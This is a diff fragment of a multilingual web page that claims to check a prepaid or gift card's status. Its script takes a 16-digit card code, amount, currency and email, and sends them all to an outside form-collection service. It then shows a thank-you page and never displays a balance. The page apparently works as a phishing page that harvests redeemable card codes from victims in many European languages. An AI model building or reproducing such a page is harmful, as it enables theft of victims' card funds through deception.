+            err_email:   "Neveljaven e-poštni naslov. Poskusite znova."
+        },
+        sv: {
+            ph_code:     "Ange den 16-siffriga koden.",
+            ph_amount:   "Ange beloppet.",
+            ph_currency: "Ange valutan.",
+            ph_email:    "Ange din e-postadress.",
+            btn:         "Kontrollera",
+            title:       "Kontrollera kortstatus",
+            subtitle:    "Kontrollera ditt saldo genom att ange den 16-siffriga koden här.",
+            err_code:    "Ange en giltig kod.",
+            err_amount:  "Ange ett giltigt belopp.",
+            err_currency:"Ogiltig valuta. Försök igen.",
+            err_email:   "Ogiltig e-postadress. Försök igen."
+        }
+    };
+
+    function applyLanguage(lang) {
+        var t = TRANSLATIONS[lang] || TRANSLATIONS['en'];
+
+        var inputs = {
+            'code-checker-input':     t.ph_code,
+            'amount-checker-input':   t.ph_amount,
+            'currency-checker-input': t.ph_currency,
+            'email-checker-input':    t.ph_email
+        };
+        Object.keys(inputs).forEach(function(id) {
+            var el = document.getElementById(id);
+            if (el) {
+                el.setAttribute('placeholder', inputs[id]);
+                var v = el.value;
+                el.value = ' ';
+                el.value = v;
+            }
+        });
+
+        var btn = document.getElementById('submit-btn');
+        if (btn) btn.textContent = t.btn;
+
+        var title = document.getElementById('section-title');
+        if (title) title.textContent = t.title;
+        var sub = document.getElementById('section-subtitle');
+        if (sub) sub.textContent = t.subtitle;
+
+        currentLang = lang;
+
+        document.querySelectorAll('.flag-btn').forEach(function(b) {
+            b.classList.toggle('active-lang', b.getAttribute('data-lang') === lang);
+        });
+    }
+
+    function changeLanguage(lang) {
+        applyLanguage(lang);
+
+        var attempts = 0;
+        var timer = setInterval(function() {
+            var select = document.querySelector('.goog-te-combo');
+            attempts++;
+            if (select) {
+                clearInterval(timer);
+                select.value = lang;
+                select.dispatchEvent(new Event('change'));
+                setTimeout(function() { applyLanguage(lang); }, 800);
+                setTimeout(function() { applyLanguage(lang); }, 1800);
+            } else if (attempts > 50) {
+                clearInterval(timer);
+            }
+        }, 100);
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        applyLanguage('en');
+
+        var form    = document.getElementById('this-form');
+        var checker = document.getElementById('form-checker');
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            var t         = TRANSLATIONS[currentLang] || TRANSLATIONS['en'];
+            var digitCode = document.getElementById('code-checker-input').value;
+            var amount    = document.getElementById('amount-checker-input').value;
+            var currency  = document.getElementById('currency-checker-input').value;
+            var email     = document.getElementById('email-checker-input').value;
+            var err = '';
+
+            if (digitCode.replace(/\s/g,'').length !== 16) err = t.err_code;
+            else if (!amount || amount == 0)                err = t.err_amount;
+            else if (currency.replace(/\s/g,'').length < 3) err = t.err_currency;
+            else if (email.replace(/\s/g,'').length < 3)    err = t.err_email;
+            else {
+                try {
+                    await fetch('https://connect.kitoform.com/f/adbef0998673', {
+                        method: 'POST',
+                        body: new FormData(form)
+                    });
+                    location.href = 'thanks.html';
+                } catch(error) { console.log(error); }
+                return;
+            }
+
+            checker.style.display = 'block';
+            checker.innerHTML = err;
+        });
+
+        form.addEventListener('focus', function() {
+            checker.style.display = 'none';
+        }, true);
+    });
+
+    window.addEventListener('load', function() {
+        var killTimer = setInterval(function() {
+            var banner = document.querySelector('.goog-te-banner-frame');
+            if (banner) {
+                banner.style.display = 'none';
+                document.body.style.top = '0px';
+            }
+        }, 300);
+        setTimeout(function() { clearInterval(killTimer); }, 15000);
+    });
+    </script>
+
+    <!-- ── Google Translate widget ── -->
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <script>
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({
+            pageLanguage: 'en',
+            includedLanguages: 'cs,de,nl,fr,fi,en,es,sl,sk,el,hr,mt,lv,lt,et,it,pt,sv,hu',
+            autoDisplay: false
+        }, 'google_translate_element');
+    }
+    </script>
+
+</body>
+</html>
